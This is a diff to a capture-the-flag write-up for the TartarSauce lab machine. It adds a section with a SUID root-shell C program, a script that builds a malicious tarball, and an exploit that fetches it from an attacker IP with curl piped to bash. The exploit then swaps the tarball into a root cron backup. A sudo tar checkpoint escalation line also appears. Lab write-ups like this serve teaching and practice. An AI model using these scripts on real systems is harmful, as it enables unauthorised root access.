@@ -418,6 +418,8 @@ jk
 
 I got access
 
+## www-data access
+
 ```bash
 $ whoami
 www-data
@@ -551,6 +553,8 @@ sudo -u onuma tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec
 ```
 
 you escalate as onuma
+
+## Onuma escalation to root
 
 ```bash
 www-data@TartarSauce:/$ sudo -u onuma tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash --checkpoint-action=exec=/bin/bashv/null --checkpoint=1
@@ -733,6 +737,101 @@ Only in /var/www/html: webservices
 ```
 
 we get the flag.
+
+## Get root shell (side quest)
+
+There is another way to got root shell not just the root flag. Refering to this part of the code
+
+```bash
+/bin/tar -zxvf $tmpfile -C $check
+if [[ $(integrity_chk) ]]
+then
+    # Report errors so the dev can investigate the issue.
+    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
+    integrity_chk >> $errormsg
+    exit 2
+else
+   ...
+fi
+```
+
+if you can place a executable with a SUID bit that is owned by root, you can run as user and you should be able to get a root shell.
+
+from what I understand it's something like this
+
+```c
+#include <unistd.h>
+#include <stdlib.h>
+
+int main() {
+    setuid(0);
+    setgid(0);
+    system("/bin/bash -p");
+}
+```
+
+build
+
+```bash
+#!/bin/bash
+
+# Run as root!
+
+# gcc shell.c -o shell -static
+gcc shell.c -o shell -static -m32 # for 32 bit
+chmod 4755 shell  # suid + executable
+
+# build evil.tar.gz
+mkdir -p evil/var/www/html
+cp shell evil/var/www/html/shell
+chmod 4755 evil/var/www/html/shell
+tar zcvf evil.tar.gz -C evil .
+
+# SECURITY!! 
+rm shell 
+rm -rf evil
+```
+
+exploit
+
+```bash
+#!/bin/bash
+
+# call with: curl http://10.10.14.97:80/backuperer-exploit-shell/exploit.sh | bash
+cd /tmp
+
+# assuming http server is running from previous exploit
+curl http://10.10.14.97:80/backuperer-exploit-shell/evil.tar.gz -o /tmp/evil.tar.gz
+
+echo "Waiting for cron..."
+
+# wait for backup to appear, then swap
+while true; do
+    f=$(find /var/tmp -maxdepth 1 -name ".*" -type f 2>/dev/null)
+    if [ -n "$f" ]; then
+        cp /tmp/evil.tar.gz "$f"
+        echo "[+] Swapped $f"
+        break
+    fi
+    sleep 1
+done
+
+# try to execute suid shell
+while true; do
+    if [ -d "/var/tmp/check" ]; then
+        # this part is a bit glitchy
+        # If you get a shell that's not root, can try to run this step again
+        sleep 2
+        exec /var/tmp/check/var/www/html/shell
+        break
+    fi
+    sleep 1
+done
+```
+
+I got the root flag
+
+![](.media/20260209115013.png)
 
 # Credentials
 
